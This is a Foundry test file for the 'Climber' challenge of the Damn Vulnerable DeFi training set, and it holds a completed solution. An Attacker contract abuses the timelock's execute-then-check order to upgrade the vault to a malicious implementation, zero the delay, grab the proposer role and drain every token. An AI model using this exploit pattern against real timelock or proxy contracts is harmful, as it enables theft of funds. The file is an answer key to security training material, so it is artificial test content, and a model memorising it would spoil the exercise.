// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {ERC1967Utils} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(timelock, vault, token, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}

contract Attacker {
    constructor(
        ClimberTimelock timelock,
        ClimberVault vault,
        DamnValuableToken token,
        address recovery
    ) {
        // Malicious implementation will have a sweepERC20 function to drain all tokens and a schedule function to reenter the timelock
        MaliciousImplementation maliciousImplementation = new MaliciousImplementation();

        // Craft malicious operations
        address[] memory targets = new address[](5);
        uint256[] memory values = new uint256[](5);
        bytes[] memory dataElements = new bytes[](5);
        bytes32 salt = bytes32(uint256(1));

        // Upgrades ClimberVault to malicious implementation
        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(
            UUPSUpgradeable.upgradeToAndCall,
            (address(maliciousImplementation), "")
        );

        // Sweeps all tokens to the recovery account
        targets[1] = address(vault);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(
            MaliciousImplementation.sweepERC20,
            (IERC20(address(token)), recovery)
        );

        // Updates the timelock delay to allow atomic execution
        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(ClimberTimelock.updateDelay, (0));

        // Gives proposer role to the malicious implementation
        targets[3] = address(timelock);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(
            AccessControl.grantRole,
            (PROPOSER_ROLE, address(maliciousImplementation))
        );

        // Calls scheduler to reenter the timelock and  propose the schedule of malicious operations batch
        targets[4] = address(maliciousImplementation);
        values[4] = 0;
        dataElements[4] = abi.encodeCall(MaliciousImplementation.schedule, ());

        // Store the malicious operations in the malicious implementation to latter reenter the timelock
        maliciousImplementation.setSchedule(
            targets,
            values,
            dataElements,
            salt,
            timelock
        );

        // Execute the malicious operations batch in the timelock
        timelock.execute(targets, values, dataElements, salt);
    }
}

contract MaliciousImplementation {
    function sweepERC20(IERC20 token, address to) external {
        token.transfer(to, token.balanceOf(address(this)));
    }

    function proxiableUUID() external view returns (bytes32) {
        return ERC1967Utils.IMPLEMENTATION_SLOT;
    }

    bytes internal scheduleEncodedCall;
    ClimberTimelock internal timelock;

    function setSchedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt,
        ClimberTimelock _timelock
    ) external {
        scheduleEncodedCall = abi.encodeCall(
            ClimberTimelock.schedule,
            (targets, values, dataElements, salt)
        );
        timelock = _timelock;
    }

    function schedule() public {
        (bool result, ) = address(timelock).call(scheduleEncodedCall);
    }
}
